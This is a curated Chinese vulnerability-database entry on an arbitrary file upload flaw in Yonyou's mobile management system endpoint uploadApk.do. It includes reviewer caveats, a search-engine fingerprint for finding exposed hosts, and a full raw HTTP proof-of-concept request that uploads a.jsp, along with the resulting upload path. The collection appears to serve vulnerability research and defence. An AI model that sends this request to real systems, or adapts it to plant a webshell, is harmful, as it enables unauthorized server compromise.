---
source: "Threekiii/Awesome-POC"
title: "用友移动管理系统 uploadApk上传"
product: "用友移动管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "示例session，未明确"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8B%20%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20uploadApk.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-4b1525da9088482e0d6c97dc"
entity_id: "ve-4b1525da9088482e0d6c97dc"
schema_version: "1"
canonical: "Web安全/ERP企业/用友GRP-u8/用友 移动管理系统 uploadApk.do 任意文件上传漏洞.md"
---

# 用友移动管理系统 uploadApk上传

## 条目说明

- 对象与具体问题：用友移动管理系统；uploadApk上传
- 版本、配置及部署条件：无版本
- 认证与权限前提：示例session，未明确
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 错GRP-U8目录，独立移动管理产品
- hello文本jsp仅证写入不证JSP执行；pk_obj空值前提未说明

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限

### 漏洞影响

用友 移动管理系统

### 网络测绘

```
app="用友-移动系统管理"
```

### 漏洞复现

登陆页面

![image-20230828164047741](./.resource/用友移动管理系统uploadApk.do任意文件上传漏洞/media/image-20230828164047741.png)

验证POC

```http
POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.ser
Connection: close

------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
Content-Type: application/msword

hello
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```

![image-20230828164101589](./.resource/用友移动管理系统uploadApk.do任意文件上传漏洞/media/image-20230828164101589.png)

```
/maupload/apk/a.jsp
```


---

> 来源：Threekiii/Awesome-POC
